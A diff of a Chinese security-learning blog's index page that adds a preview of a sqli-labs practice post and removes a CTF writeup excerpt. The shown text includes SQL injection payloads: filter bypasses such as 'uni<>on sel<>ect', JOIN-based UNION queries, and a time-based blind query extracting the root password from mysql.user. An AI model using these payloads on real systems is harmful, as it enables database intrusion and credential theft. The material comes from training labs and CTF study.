@@ -147,6 +147,67 @@
 
     
     <article
+  id="post-sqli-lab"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/12/25/sqli-lab/"
+    >sqli-labs</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/12/25/sqli-lab/" class="article-date">
+  <time datetime="2019-12-25T07:01:37.000Z" itemprop="datePublished">2019-12-25</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>前言</p>
+<pre><code>最近在研究sql注入，sqli-labs是一个专业的sql注入练习平台，于是自己搭建了一个，记录一下学习过程。</code></pre><p>Less-1</p>
+<pre><code>根据提示可以知道，这是一道单引号注入的题目
+首先他让我们输入ID
+i[](./05ab1d2d3f4f5421f749a046d8f3a56.png)    
+先get一个参数进行测试</code></pre> 
+      <a class="article-more-link" href="/2019/12/25/sqli-lab/"
+        >阅读更多...</a
+      >
+       
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqli-lab/" rel="tag">sqli-lab</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
   id="post-php函数学习"
   class="article article-type-post"
   itemscope
@@ -601,63 +662,6 @@ lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb�
   <p>首先 要对id注入。首先试一下order by，发现错误，可能是关键字过滤。</p>
 <p>试了试/**/还是不行，改用&lt;&gt;发现可以了</p>
 <p>payload如下<br>、<br>?id=1 ord&lt;&gt;er by 3 –<br>?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 –<br>剩下的正常注入</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%AD%A6%E4%B9%A0/" rel="tag">ctf学习</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-i春秋-sqli-wirteup"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2018/12/12/i%E6%98%A5%E7%A7%8B-sqli-wirteup/"
-    >i春秋 sqli wirteup</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2018/12/12/i%E6%98%A5%E7%A7%8B-sqli-wirteup/" class="article-date">
-  <time datetime="2018-12-12T07:04:24.000Z" itemprop="datePublished">2018-12-12</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>sql注入时，逗号被过滤后可用payload</p>
-<p>select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97);</p>
-<p>127’ UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#</p>
-<p>select case when substring((select password from mysql.user where user=’root’) from 1 for 1)=’e’ then sleep(5) else 0 end #</p>
-<p>substring((select password from mysql.user where user=’root’) from -1）=’e’</p>
  
       <!-- reward -->
       
